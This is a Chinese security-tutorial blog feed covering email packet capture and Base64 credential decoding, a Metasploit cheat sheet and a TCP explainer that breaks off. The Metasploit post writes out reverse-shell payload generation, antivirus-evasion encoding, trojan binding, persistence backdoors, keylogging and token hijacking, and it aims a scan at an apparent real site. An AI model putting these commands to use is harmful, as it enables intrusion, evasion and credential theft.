        <content type="html"><![CDATA[<p>##电子邮件的传输机制<br>电子邮件系统是基于客户端/服务器模式的（C/S），但是邮件从发件人的客户端发送到收件人的客户端的过程中，还需要邮件服务器之间的相互传输。因此，与其它单纯的客户端/服务器的工作模式（如FTP、Web等）相比，电子邮件系统相对要复杂。其示意图如下：<br><img src="/2017/03/28/E-mail数据包的分析/1.jpg" alt="1"><br>从上图中可以看到，整个电子邮件的传输过程是由多个软件程序组成的。包括有：</p>
<p>1、MUA（Mail User Agent，邮件用户代理）：一般也被称为邮件客户端软件。MUA软件的功能是为用户提供发送、接收和管理电子邮件的界面。比如我们这次的实验所使用的Foxmail就属于MUA。</p>
<p>2、MTA（Mail Transfer Agent，邮件传输代理）：一般也被称为邮件服务器端软件。MTA软件负责接收客户端软件发送的邮件，并将邮件传输给其它的MTA程序，是电子邮件系统中的核心部分。</p>
<p>3、MDA（Mail Delivery Agent，邮件分发代理）：MDA软件负责在服务器中将邮件分发到用户邮箱目录。MDA软件比较特殊，它并不直接面向邮件用户，而是在后台默默地工作。有时候MDA的功能可以直接集成在MTA软件中，因此常常被忽略。</p>
<p>上图所示的详细过程如下：</p>
<p>1、MUA使用SMTP协议将邮件发送给MTA。</p>
<p>2、MTA收到邮件后，要根据收件人的信息决定下一步的动作。如果收件人是自己系统上的用户，则直接投递。反之则需要把邮件传递给对方网络系统的MTA。此时可能需要经过多个MTA的转发才会真正到达目的地。如果邮件无法投递给本地用户，也无法转交给其它的MTA处理，则需要把邮件退还给发件人，或者发通知邮件给管理员。</p>
<p>3、邮件最终到达了收件人所在网络的MTA，于是该MTA发现收件人是本地系统的用户，就交给了MDA处理，MDA再把邮件投递到收件人的信箱里。信箱的形式可以是普通的目录，也可以是专用的数据库。不论是哪种形式，这些邮件都需要有一种长期保存的机制。</p>
<p>4、邮件被放入信箱后，就会一直保存下来，直到收件人来取。收件人也是通过MUA来读取邮件的，但是此时MUA要联系的并不是发邮件时所联系的MTA，而是另一个提供POP/IMAP服务的软件。而且读取邮件时所采用的协议也不是SMTP，而是POP3或者IMAP。</p>
<p>上图中的两个MTA分别承担了发邮件和收邮件的功能。实际上，任何MTA都可以同时承担收邮件和发邮件的功能。也就是除了接受MUA的委托，将邮件投递到收件人所在的邮件系统以外，还可以接收另一个MTA发来的邮件，然后根据收件人信息决定投递给本地用户还是转发给其它的MTA。  </p>
<p>##SMTP协议概述<br>SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议，它是一种用于由源地址到目的地址传送邮件的规则，由它来控制信件的中转方式。SMTP协议属于TCP/IP协议族，使用的默认端口号为25。它帮助每台计算机在发送或中转信件时找到下一个目的地。通过SMTP协议所指定的服务器，就可以把E-mail寄到收信人的服务器上了。SMTP服务器是遵循SMTP协议的发送邮件服务器，用来发送或中转发出的电子邮件。它使用由TCP提供的可靠的数据传输服务把邮件消息从发信人的邮件服务器传送到收信人的邮件服务器。跟大多数应用层协议一样，SMTP也存在两个端：在发信人的邮件服务器上执行的客户端和在收信人的邮件服务器上执行的服务器端。SMTP的客户端和服务器端同时运行在每个邮件服务器上。当一个邮件服务器在向其他邮件服务器发送邮件消息时，它是作为SMTP客户在运行。SMTP的工作模型如下图所示：<br><img src="/2017/03/28/E-mail数据包的分析/2.jpg" alt="2"><br>1、发送方首先向对方的25号端口发起TCP的连接请求，接收方收到请求之后，就建立了TCP连接。</p>
<p>2、连接建立之后，发送方就可以向接收方发送SMTP命令了。</p>
<p>3、接收方收到命令之后，根据具体的情况决定是否执行，然后给发送方返回相应的应答。  </p>
<p>##POP协议概述<br>POP（Post Office Protocol，邮局协议）主要用于从邮件服务器收取邮件。目前POP协议的最新版本为POP3。大多数的MUA软件都支持使用POP协议，因此应用得最为广泛。POP3协议使用的TCP端口为110。其工作模型与SMTP类似，主要分为以下几个步骤：</p>
<p>1、客户端首先向POP3服务器的110号端口发起TCP连接请求，服务器接受了请求之后就建立了TCP连接。</p>
<p>2、建立连接之后，客户端就可以向服务器发送POP3命令了。</p>
<p>3、服务器收到命令之后，根据具体的情况决定是否执行，然后给客户端回复相应的应答。  </p>
<p>##IMAP协议概述<br>IMAP（Internet Mail Access Protocol，Internet邮件访问协议）以前称作交互邮件访问协议（Interactive Mail Access Protocol）。IMAP是斯坦福大学在1986年开发的一种邮件获取协议。它的主要作用是邮件客户端可以通过这种协议从邮件服务器上获取邮件的信息，下载邮件等。IMAP协议运行在TCP/IP协议之上，使用的端口是143。它与POP3协议的主要区别是用户可以不用把所有的邮件全部下载，可以通过客户端直接对服务器上的邮件进行操作。</p>
<p>IMAP和POP是最常见的读取邮件的Internet协议标准，目前在使用的绝大部分的邮件客户端和服务器都支持这两种协议。  </p>
<p>##E-Mail数据包的捕获<br>我们这次的实验需要使用Foxmail客户端来收发邮件，并利用Wireshark将收发邮件过程中的数据包捕获下来进行分析。我在我的虚拟机中安装了Foxmail的7.2版本，然后将我的电子邮箱ioio_jy@sohu.com配置到Foxmail中，那么接下来就可以利用Foxmail客户端开始收发邮件的操作了。</p>
<p>这里可以首先打开Wireshark，在捕获选项中添加进tcp的筛选条件。然后在Foxmail中给我自己的邮箱发一封电子邮件，并附上我的一张照片作为附件（照片的具体内容，我这里先卖一个关子，下次课我会通过解密手段给大家看），如下图所示：<br><img src="/2017/03/28/E-mail数据包的分析/3.jpg" alt="3"><br>在发送之前，先开启Wireshark进行监控，之后再回到Foxmail客户端进行发送，成功后就可以捕获到非常多的数据包了。由于是给我自己的邮箱发送邮件，所以我很快就能收到，那么我在收到并打开邮件后，Wireshark也会捕获到收取邮件的数据包，也就是我们这次的实验文件Lab20-1.pcapng。  </p>
<p>##发送邮件数据包分析<br>打开实验文件以后，我们首先可以看到TCP的三次握手，毕竟SMTP是基于TCP协议的。下面我们把关注的重心放到SMTP的数据包上，使用筛选器只保留SMTP的数据包，如下图所示：<br><img src="/2017/03/28/E-mail数据包的分析/4.jpg" alt="4"><br>发送邮件的详细过程如下：</p>
<p>5：客户端向服务器发送的EHLO指令，用于向服务器表明自己的身份。从这个数据包的信息中，可以看到客户端的主机名称为jiang-1a3c6c581。</p>
<p>8：客户端发送的AUTH LOGIN指令，请求登录认证。</p>
<p>11：这里的User指令表示邮箱登录的用户名。可以看到这里是经过了加密的。SMTP不接收明文，必须要通过64位的编码后再发送。从后面的两个等于号基本可以确定，它采用的是Base64的加密形式，因为等于号在Base64中就是用于填充的。如果大家想要深入了解这方面的相关知识的实际应用，可以参考我所主讲的《恶意代码分析实战》课程的相关章节。</p>
<p>14：这里的Pass表示登录密码，同样采用了Base64进行加密。关于解密的方式，我会在下次课程中详细讲解。</p>
<p>16：这个数据包表示邮箱登陆成功：<br><img src="/2017/03/28/E-mail数据包的分析/5.jpg" alt="5"><br>17：发送邮件的账户，这里是ioio_jy@sohu.com。</p>
<p>20：接收邮件的账户，由于是给我自己写信，所以同样是ioio_jy@sohu.com。</p>
<p>23：DATA表示客户端发送的内容。</p>
<p>25：服务器端使用了<cr><lf>接收了文本的内容。因为SMTP属于请求/应答的模式，请求和应答都是基于ASCII文本，并以CR和LF（回车换行）为结束符。</lf></cr></p>
<p>26：所发送的数据，由于这个邮件包含的数据比较多，因此会分为多个数据包进行发送，也就是从26到140号数据包。</p>
<p>143：发送邮件的账户及主题等信息。</p>
<p>149：表示断开与邮件服务器的连接。</p>
<p>以上就是发送邮件的整个过程。如果想要查看发送邮件的详细信息，可以在任意一个数据包上单击鼠标右键，并选择Follow TCP Stream命令进行查看：<br><img src="/2017/03/28/E-mail数据包的分析/6.jpg" alt="6"><br>在这个对话框中就可以清晰的显示出邮件的信息，其中红色的部分是客户端发送的信息，蓝色部分是服务器响应的信息。并且还可以看到客户端的主机名、邮件账户、使用的邮件客户端、邮件内容类型和传输格式等。更重要的是，还可以看到邮件的内容以及附件的名称：<br><img src="/2017/03/28/E-mail数据包的分析/7.jpg" alt="7"><br>接下来的乱码是我们的附件经过加密后所得到的十六进制编码信息。这里同样是使用Base64进行加密的。关于这段代码的解密工作，我们在下次的课程中再进行论述。  </p>
<p>##接收邮件数据包分析<br>为了能够方便地查看与接收邮件相关的数据包，这里我们需要使用筛选条件pop：<br><img src="/2017/03/28/E-mail数据包的分析/8.jpg" alt="8"><br>POP协议也是基于TCP协议的，所以在使用POP接收数据包之前同样会经过TCP的三次握手操作，只不过这里被过滤掉了。</p>
<p>159：这里的USER表示的是用户名，这里显示的是ioio_jy@sohu.com。</p>
<p>162：这里的PASS表示的是客户端输入的密码，这里的密码为jiangye。由于POP允许明文传输，所以这里输入的用户名和密码等信息都是以明文提供的。</p>
<p>164：说明用户名和密码验证成功。</p>
<p>165：是客户端向服务器发送的STAT命令，用于统计邮件信息。</p>
<p>168：发送了LIST命令，用于列出邮件的大小。</p>
<p>169：是对于上一个数据包的回应，回复了每个邮件的大小：<br><img src="/2017/03/28/E-mail数据包的分析/9.jpg" alt="9"><br>在Packet Details面板中，可以看到服务器响应客户端的邮件大小的情况。如“1 77337\r\n”，表示这是第一封邮件，大小为77337字节，“\r\n”是结束符。</p>
<p>174：客户端向服务器发送UIDL命令，请求邮件的唯一标识符。</p>
<p>176：服务器对于客户端的响应信息：<br><img src="/2017/03/28/E-mail数据包的分析/10.jpg" alt="10"><br>在上图中可以看到每封邮件的唯一标识符。</p>
<p>184：客户端向服务器发送的RETR命令，请求邮件的内容。</p>
<p>187：服务器响应客户端的请求，返回邮件的大小。一直到193号数据包都是邮件的大小。</p>
<p>194：显示了邮件的发送方是ioio_jy@sohu.com，主题为WiresharkTest，接下来的数据包就是邮件中的具体内容。</p>
<p>262：表示终止客户端与POP3服务器之间的连接。</p>
<p>经过上述分析，我们可以知道接收邮件的整个过程，接下来我们同样可以利用TCP Stream来查看邮件的信息。我们可以看到接收邮件的用户名、密码、邮件大小、邮件的唯一标识符及邮件的全部文本内容等信息。</p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[E-mail数据包的解密]]></title>
        <url>https://517736522.github.io/2017/03/28/E-mail%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E8%A7%A3%E5%AF%86/</url>
        <content type="html"><![CDATA[<p>##用户名和密码的解密<br>这里我们打开实验文件Lab21-1.pcapng，其实这次的文件和上次的是完全一样的。我们同样使用筛选器筛选出SMTP协议，找到加密的User以及Pass的部分：<br><img src="/2017/03/28/E-mail数据包的解密/1.jpg" alt="1"><br>我在上次的课程中说过，只要见到加密字符串的后面出现了等于号，那么就应当怀疑它使用的是Base64进行加密的。想要实现解密，最简单的方法可以使用现成的Base64解密软件，这里我是用的是Base64V1.6这款工具。User以及Pass的加密字符串已经放在了User&amp;Pass.txt这个文件中，那么只要把想解密的内容拷贝到解密程序中即可：<br><img src="/2017/03/28/E-mail数据包的解密/2.jpg" alt="2"><br>可以看到，这里解密出的用户名是ioio_jy@sohu.com。同理可以知道，我的登录密码是jiangye。当然，我在结束本次课程的讲解后，密码就不是这个了。</p>
<p>除了使用现成的软件，我们也可以使用Python自带的解密函数库实现解密的操作。这里我所使用的Python版本为2.7，那么只要安装完毕，在开始菜单的Python 2.7目录中就可以找到IDLE，从而打开shell。接下来就可以通过Python代码进行解密了：<br>import base64<br>cipher = ‘amlhbmd5ZQ==’<br>plaintext = base64.b64decode(cipher)<br>print plaintext<br>如下图所示：<br><img src="/2017/03/28/E-mail数据包的解密/3.jpg" alt="3"><br>可以看到，使用这种方法同样可以实现解密的操作。  </p>
<p>##附件内容的解密<br>这里我们可以通过TCP Stream再来查看一下附件的内容：<br><img src="/2017/03/28/E-mail数据包的解密/4.jpg" alt="4"><br>这里包含了附件的名称以及附件二进制数据加密后的内容。这里我们首先对其进行Base64的解密。我已经把加密的附件内容提取出来并保存在了cipherfile.txt文件中。那么接下来可以通过编写Python程序实现解密的操作：</p>
<p>导入解密函数库<br>import base64<br>打开并读取密码文件<br>cipher_file = open(‘cipherfile.txt’)<br>cipher_text = cipher_file.read( )<br>利用导入库中的解密函数进行解密<br>plain_test = base64.b64decode(cipher_text)<br>cipher_file.close( )<br>创建解密文件<br>plain_file = open(‘plainfile.txt’, ‘w’)<br>将解密内容写入文件<br>plain_file.write(plain_test)<br>plain_file.close( )  </p>
<p>将这个解密程序（decodefile.py）以及密码文件（cipherfile.txt）放到C盘的根目录（主要是为了接下来的操作方便）。然后打开cmd，切换到C盘根目录，直接输入解密程序的文件名，然后可以看到在C盘根目录中就多出来一个名为plainfile.txt的解密文件了。  </p>
<p>我们所得到的这个文件是一个二进制文件，直接利用记事本打开的话就是一堆乱码。因此下一步我们需要确定这个文件的类型。当然可能有朋友会说，我们不是已经在TCP Stream中看到了这个文件的名称是IMG_1014.JPG吗，那么为什么还要确定它的文件类型呢？确实，对于我们这次的实验而言，通过观察TCP Stream的内容就可以确定文件的类型。但是我们既然研究网络安全，就需要掌握文件类型分析的基本方法。因为我们在现实环境中所抓取的数据包中，发信人可能会为了起到保密的效果，而故意舍去文件的扩展名，或者干脆将原始文件的扩展名改成一个错误的扩展名。一旦遇到这种情况，就需要我们自己来确定这个文件的类型了，否则是打不开的。  </p>
<p>这里我们使用文件格式识别工具（FFV.exe）来检测一下plainfile.txt这个文件：   </p>
<p><img src="/2017/03/28/E-mail数据包的解密/5.jpg" alt="5"><br>可以看到，这款软件并没有受到目标文件扩展名的影响，准确地识别出了目标文件的类型，属于“JPEG联合图像专家组图形文件”。但是如果我们没有FFV.exe这款工具该怎么办呢？那么这就需要我们弄清楚每一种文件的格式信息。举个简单的例子，判断PE文件，最简单的办法是查看文件头部是否包含有MZ以及PE这几个字符，更进一步，如果想要分辨exe格式、sys格式以及dll格式的话，就需要对相关标志位进行解析了。其实这种思想对于判断其它文件类型也是适用的。不同的文件往往会在文件的头部加上自己文件的专属标志，图片文件也是如此，就比如说我们这次的这个JPG文件，它的开头的两个字节固定就是0xFFD8，那么由此就可以知道文件的格式了（有时也可以通过头部的JFIF标志辨别）。</p>
<p>下面我们就可以把plainfile.txt的扩展名修改为jpg了。那么现在不妨打开看看这个图片：<br><img src="/2017/03/28/E-mail数据包的解密/6.jpg" alt="6"><br>可以发现，图片虽然能够打开，但是图片的内容明显并不是我。看来我们还需要对其进行进一步的研究。</p>
<p>图像文件的基本属性，比如大小，颜色等信息是保存在二进制文件的头部的，通过查看这个文件的属性，可以看到重要的信息都在，说明文件的问题出在保存有图像具体信息的二进制代码中。初步考虑，可能是在网络传输的过程中，为了安全的考虑而做的第二次加密（当然是否真的是二次加密，需要经过分析才可以知道）。但是它究竟采用了怎样的加密方式，并不好判断。所以这里我决定将这个文件与原始的图片文件进行二进制层面的比较，以找到最终的原因。这里我使用Beyond Compare这款工具，将两个图片文件载入进行对比分析（Hex Compare）：<br><img src="/2017/03/28/E-mail数据包的解密/7.jpg" alt="7"><br>上图中，位于上面的是原始图片，下面的是我们刚刚解密出的图片。从两个文件的大小可以发现，解密后的文件比原始文件多了210个字节，那么弄清楚这210个字节的不同，也许就是解开谜题的关键。</p>
<p>Beyond Compare这款工具已经帮我们找到了二者的不同。仔细分析可以发现，相比而言，最大的不同在于我们解密出的文件多出来很多0x0D这个字节。这个字节的出现有什么规律呢？是不是每隔一定的字节数，就会重复出现呢？数一数似乎并不是这样。那就分析一下它周围的字节，可以发现所有0x0D的后面都紧跟着一个0x0A，而如果观察原始图片的二进制信息，可以发现0x0A前面并没有0x0D。</p>
<p>事实上，在ASCII码中0x0A表示的是换行键（LF），而0x0D表示的是回车键（CR）。我们上次课说过，服务器端使用了接收文本的内容。因为SMTP属于请求/应答的模式，请求和应答都是基于ASCII文本，并以CR和LF（回车换行）为结束符。这样我们就知道了，看来系统是在所有的换行键前面加上了一个回车键。</p>
<p>既然这样，我们就可以尝试一下，将我们解密得到的文件中所有的0x0D0A替换为0x0A。可以使用WinHex来完成这个操作。 首先使用WinHex打开plainfile.jpg，然后选择菜单栏中的“搜索”-&gt;“替换16进制值”，在弹出的对话框中分别填入0d0a以及0a，表示用后者替代前者，然后确定。此时WinHex会告诉我们已经替换了210处，实际上这也就说明文件缩小了210个字节，这与我们之前所发现的两个文件的大小差异是一致的。那么下面我们保存，然后再尝试打开这个文件：<br><img src="/2017/03/28/E-mail数据包的解密/8.jpg" alt="8"><br>可见，文件已经成功地打开了。我觉得这个图片和我真人相比较，还是非常的传神的。  </p>
<p>##小结<br>我们这次的实验学习了在通过抓包的方式获取了电子邮件数据后，如何对加密内容实现解密的操作。其实我这次所展示给大家的都是一些基本的方法。也希望大家能够以此作为起点，多多学习，多多实践，早日成为网络安全领域的专家。</p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[Metasploit常用模块]]></title>
        <url>https://517736522.github.io/2017/03/28/Metasploit%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/Metasploit常用模块/1.jpg" alt="1"><br><img src="/2017/03/28/Metasploit常用模块/2.jpg" alt="2">  </p>
<p>##metasploit升级更新<br>msfconsole目录在/usr/share/metasploit-framework<br>运行msfupdate即可更新  </p>
<p>##metasploit端口扫描<br>在msfconsole中可调用nmap -v -sV target<br>msf中的模块：auxiliary/scanner/portscan/syn<br><img src="/2017/03/28/Metasploit常用模块/3.jpg" alt="3"><br>auxiliary/scanner/portscan/tcp<br><img src="/2017/03/28/Metasploit常用模块/4.jpg" alt="4">  </p>
<p>##SMB扫描获取系统信息<br>auxiliary/scanner/smb/smb_version<br><img src="/2017/03/28/Metasploit常用模块/5.jpg" alt="5">  </p>
<p>##ssh,ftp服务识别<br>auxiliary/scanner/ssh/ssh_version<br><img src="/2017/03/28/Metasploit常用模块/6.jpg" alt="6"><br>auxiliary/scanner/ftp/ftp_version<br><img src="/2017/03/28/Metasploit常用模块/7.jpg" alt="7">  </p>
<p>##密码嗅探<br>auxiliary/sniffer/psnuffle<br><img src="/2017/03/28/Metasploit常用模块/8.jpg" alt="8"><br>用ftp登录后<br><img src="/2017/03/28/Metasploit常用模块/9.jpg" alt="9">  </p>
<p>##snmp扫描<br><img src="/2017/03/28/Metasploit常用模块/10.jpg" alt="10"><br>auxiliary/scanner/snmp/snmp_login<br>对一台host进行字符串爆破<br><img src="/2017/03/28/Metasploit常用模块/11.jpg" alt="11"><br>auxiliary/scanner/snmp/snmp_enum<br>对多台host进行单一字符串的枚举<br><img src="/2017/03/28/Metasploit常用模块/12.jpg" alt="12">  </p>
<p>##SMB登录验证<br>auxiliary/scanner/smb/smb_login<br>对445SMB服务进行枚举破解<br><img src="/2017/03/28/Metasploit常用模块/13.jpg" alt="13">  </p>
<p>##VNC身份验证  </p>
<p>auxiliary/scanner/vnc/vnc_none_auth<br>枚举主机，爆出版本<br><img src="/2017/03/28/Metasploit常用模块/14.jpg" alt="14">  </p>
<p>##WMAP web扫描<br>先是启用数据库postgreSQL<br><img src="/2017/03/28/Metasploit常用模块/15.jpg" alt="15"><br>再启用msf,会连接数据库  </p>
<p>读取wmap<br><img src="/2017/03/28/Metasploit常用模块/16.jpg" alt="16"><br>添加url<br>wmap_sites -a <a href="http://www.0day.co" target="_blank" rel="external">http://www.0day.co</a><br>查看列表<br>wmap_sites -l<br>将出现的ip地址记住用于添加目标<br>wmap_targets -t <a href="http://210.209.122.31" target="_blank" rel="external">http://210.209.122.31</a><br>查看<br>wmap_targets -l<br>加载扫描模块<br>wmap_run -t  </p>
<p><img src="/2017/03/28/Metasploit常用模块/17.jpg" alt="17"><br>会扫描到web的常有漏洞<br>开始扫描<br><img src="/2017/03/28/Metasploit常用模块/18.jpg" alt="18"><br>扫描完成后查看结果<br>wmap_vulns -l<br>vulns<br>发现的目录，注入漏洞等···  </p>
<p>##远程代码执行<br>利用的是ms08-067  exploit/windows/smb/ms08_067_netapi<br>payload为windows/meterpreter/reverse_tcp反弹连接<br>这个模块不会自动选择系统<br>所以需要自己指定<br>可用nmap -O 扫描出来  </p>
<p>##MIDI文件解析远程代码执行<br>利用的是ms12-004 IE漏洞<br>exploit/windows/browser/ms12_004_midi<br><img src="/2017/03/28/Metasploit常用模块/19.jpg" alt="19"><br>低版本IP访问给出的连接时，会暂时无响应状态<br><img src="/2017/03/28/Metasploit常用模块/20.jpg" alt="20"><br>会自动化使用migrate转移进程寄生  </p>
<p>##口令安全<br>mysql破解模块auxiliary/scanner/mysql/mysql_login<br>自备字典，设置RHOSTS,USERNAME,PASS_FILE,THREADS<br>即可枚举密码  </p>
<p>ssh破解模块auxiliary/scanner/ssh/ssh_login<br>同样以上设置即可  </p>
<p>ftp/ftp_login模块等等  </p>
<p>#后渗透模块  </p>
<p>##Hash值传递渗透   </p>
<p>###知道密码的情况下：<br>先利用psexec模块渗透到一台HOSTexploit/windows/smb/psexec<br><img src="/2017/03/28/Metasploit常用模块/21.jpg" alt="21"><br>获取meterpreter后用hashdump命令获取hash  `<br><img src="/2017/03/28/Metasploit常用模块/22.jpg" alt="22">  </p>
<p>###不知道密码的情况下但知道hash值使用hash值传递：<br><img src="/2017/03/28/Metasploit常用模块/23.jpg" alt="23">  </p>
<p>##NDProxy内核提权<br>假如有一个权限比较小的主机，那么可用ms14002进行提权<br>exploit/windows/local/ms_ndproxy  </p>
<p><img src="/2017/03/28/Metasploit常用模块/24.jpg" alt="24"><br>set session 1<br>exploit即可提权（这个是跟pdf有关）<br>也可以getsystem提权<br><img src="/2017/03/28/Metasploit常用模块/25.jpg" alt="25">  </p>
<p>##多种后门生成<br>windows下的payload<br>msfpayload windows/meterpreter/reverse_tcp LHOST=xxxx LPORT=xxxx  X &gt;/root/1.exe<br>生成windows下的反弹的shell,X代表二进制<br>在目标运行之前需要启用监听器exploit/multi/handler<br>payload为刚刚的后门<br>目标执行后便可得到shell  </p>
<p>linux下的payload<br>msfpayload linux/x86/shell_reverse_tcp LHOST=xxx LPORT=xxx X&gt;linux<br>设置监听器，目标运行需要读取的权限<br>chmod 777 linux<br>./linux  </p>
<p>java下的payload<br>msfpayload java/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx W&gt;123.jar  </p>
<p>php下的payload<br>msfpayload php/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx R | msfencode -e php/base64 -t raw -o 123.php  </p>
<p>android下的payload<br>msfpayload android/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx R &gt;1.apk  </p>
<p>##内网渗透<br>meterpreter&gt; run get_local_subnets获取目标网段<br>run autoroute -s 192.168.48.0/24使用该主机进行内网穿透<br>run autoroute -p 查看路由表  </p>
<p>假设有域的存在且此主机为域的一员：<br>use incognito加载劫持工具<br>list_tokens -u 查看令牌<br>找到域管理员的令牌进行劫持<br>impersonate_token ADMIN-xxxxx\sss<br>成功后获得域管理员的shell了  </p>
<p>可以利用嗅探模块auxiliary/sniffer/psnuffle<br>嗅探敏感信息<br><img src="/2017/03/28/Metasploit常用模块/26.jpg" alt="26">  </p>
<p>##反反病毒（免杀）<br>msfpayload windows/shell/reverse_tcp LHOST=xxx LPORT=xxx R | msfencode -e x86/shikata_ga_nai -t exe &gt;123.exe<br>利用编码器进行免杀,免杀360了。。<br>msfencode -l 查看编码<br><img src="/2017/03/28/Metasploit常用模块/27.jpg" alt="27"><br>多次编码效果更佳<br>msfpayload windows/shell/reverse_tcp LHOST=xxx LPORT=xxx R | msfencode -e x86/shikata_ga_nai -c 10 -t raw | msfencode -e x86/countdown -c 5 -t exe -o /123.exe  </p>
<p>绑定文件<br>msfpayload windows/shell/reverse_tcp LHOST=xxx LPORT=xxx R | msfencode  -t  exe -x /root/ftp.exe -o 123123.exe  -e x86/countdown -k -c 10<br>绑定ftp.exe并编码  </p>
<p>upx加壳（加上去不好，容易报毒）<br>upx -5 /123.exe<br><img src="/2017/03/28/Metasploit常用模块/28.jpg" alt="28">  </p>
<p>##玩转不一样的XSS<br>auxiliary/server/capture/http_javascript_keylogger<br><img src="/2017/03/28/Metasploit常用模块/29.jpg" alt="29"><br>set DEMO true<br>set URIPATH /<br>set srvport 80<br>run<br>访问之<br><img src="/2017/03/28/Metasploit常用模块/30.jpg" alt="30"><br><img src="/2017/03/28/Metasploit常用模块/31.jpg" alt="31"><br>可以伪造qq邮箱登录页面等等进行记录  </p>
<p>##维持访问<br>在获得session后，留下后门的方式<br>meterpreter&gt;  run metsvc -A创建后门服务<br><img src="/2017/03/28/Metasploit常用模块/32.jpg" alt="32"><br>以后想连接时，应使用exploit/mulit/handler<br>使用的payload为windows/metsvc_bind_tcp<br><img src="/2017/03/28/Metasploit常用模块/33.jpg" alt="33"><br>LPORT 为上图的31337<br><img src="/2017/03/28/Metasploit常用模块/34.jpg" alt="34">  </p>
<p>进行键盘记录也是留下后门的一种<br>meterpreter &gt; keyscan_start开始键盘监听<br>keyscan_dump显示键盘记录<br><img src="/2017/03/28/Metasploit常用模块/35.jpg" alt="35">  </p>
]]></content>
        
        <categories>
            
            <category> Metasploit系列教程 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[TCP与UDP协议详解]]></title>
        <url>https://517736522.github.io/2017/03/28/TCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/</url>
        <content type="html"><![CDATA[<p>##TCP端口<br>TCP的全称是Transmission Control Protocol，即传输控制协议。它在RFC 793中被定义。所有TCP通信都会使用源端口和目的端口，这些信息可以在每个TCP数据包的头部找到。而为了能够将数据传输到远程服务器或设备的特定应用中去，TCP数据包必须知道远程服务所监听的端口。如果想要尝试连接一个不同于所设置的端口，那么这个通信就会失败。一般来说，TCP通信中的源端口并不重要，可以随机选择。而在使用TCP通信的时候，我们一共可以使用65535个端口。其中1至1023号端口属于标准端口组，往往是特定的服务所使用的。而1024至65535号端口则是临时端口，需要使用时，操作系统会在通信时以随机的方式或者采用一定的策略进行选择。</p>
<p>为了更好地理解端口，这里我们打开Lab8-1.pcap实验文件：<br><img src="/2017/03/28/TCP与UDP协议详解/1.jpg" alt="1"><br>我们来查看一下第一个数据包的TCP头部。可以看到这个数据包是从IP地址为172.16.16.128发往212.58.226.142的，它的源端口号是2826，属于临时端口，它是由操作系统选取的。目的端口是80端口，这是一个标准端口，这个端口通常提供给使用HTTP的Web服务器。其实Wireshark自身会维护一个端口列表，记录这些端口关联的常用服务，我们可以选择菜单栏的“Edit”-&gt;“Preference”-&gt;“Name Resolution”，勾选“Resolve transport names”，就可以打开传输端口的解析。但是有些时候开启解析可能会对我们的分析造成困扰，因此希望大家按照实际情况使用。</p>
<p>第二个数据包是从IP地址为212.58.226.142发往172.16.16.128的，除了IP地址相反之外，源端口和目标端口也是相反的：<br><img src="/2017/03/28/TCP与UDP协议详解/2.jpg" alt="2"><br>事实上，所有基于TCP的通信都以相同的方式工作：选择一个随机的源端口与一个已知的目标端口进行通信。在发出数据包之后，远程设备就会与源设备使用建立起的端口进行通信  </p>
<p>##TCP的三次握手<br>由于TCP提供的是可靠的数据传输，因此在传输之前，需要与目标主机建立连接。而所有基于TCP的通信都需要以两台主机之间的握手开始。这里我们结合下图进行分析：<br><img src="/2017/03/28/TCP与UDP协议详解/3.jpg" alt="3"><br>请大家注意的是，上图中的seq表示的是请求的序列号，ack表示确认序列号，SYN和ACK为控制位。 1、第一次握手 在第一次握手建立连接时，客户端会向服务器发送SYN数据包（SYN=1，seq=x），并进入SYN_SENT状态，等待服务器的确认。 2、第二次握手 第二次握手其实是分为两步来完成的，即SYN加上ACK，也就是请求和确认数据包。 （1）服务器收到了客户端的请求，向客户端回复一个确认信息（ack=x+1）。 （2）服务器再向客户端发送一个SYN包（seq=y）从而建立连接请求，此时服务器进入了SYN_RCVD状态。 3、第三次握手 第三次握手时客户端收到服务器的回复，也就是SYN加上ACK数据包。此时，客户端也要向服务器发送确认数据包（ACK）。发送完毕之后，客户端和服务器就进入了ESTABLISHED的状态，从而完成了三次握手。那么接下来，客户端和服务端就可以开始传输数据了。</p>
<p>下面我们结合Lab8-2.pcap文件在Wireshark中查看一下TCP三次握手的过程：<br><img src="/2017/03/28/TCP与UDP协议详解/4.jpg" alt="4"><br>需要说明的是，Wireshark为了让我们分析更加简便，引入了一个新的特性，可以自动将TCP数据包的序列号替换为相对值。但是这里我们不需要这个功能，我们希望看到原始值，可以选择菜单栏的“Edit”-&gt;“Preference”，展开窗口左侧的“Protocols”并选择“TCP”，然后取消勾选“Analyze TCP sequence numbers”，再单击OK即可。</p>
<p>这个捕获文件的第一个数据包就是初始的SYN数据包，它从172.16.16.128发往212.58.226.142的80号端口。可以看到它的序列号是3691127924。第二个数据包是从212.58.226.142发出的SYN/ACK响应：<br><img src="/2017/03/28/TCP与UDP协议详解/5.jpg" alt="5"><br>这个数据包里面包含有这台主机的初始序列号（233779340），以及一个确认号（3691127925），注意这个确认号比上一个数据包的序列号大1，因为这个域是用来表示主机所期望得到的下一个序列号的值，有助于数据包的顺序传输。 第三次握手的数据包是从172.16.16.128发出的ACK数据包：<br><img src="/2017/03/28/TCP与UDP协议详解/6.jpg" alt="6"><br>这个数据包正如所期望的那样，包含有之前数据包的确认号域所定义的序列号3691127925，通过这个序列号，就可以知道数据的传输顺序没有问题。只要网络中存在有TCP通信，那么我们都会看到这个模式的三次握手。  </p>
<p>##TCP的断开<br>在TCP通信中，每次握手之后都会有断开的操作，一旦TCP通信结束，就会使用4个数据包以及一个FIN标志表明连接的结束。如下图所示：<br><img src="/2017/03/28/TCP与UDP协议详解/7.jpg" alt="7"><br>TCP的断开步骤如下：</p>
<pre><code>1、客户端向服务器发送一个设置了FIN和ACK标志位的TCP数据包，告诉服务器通信完成。
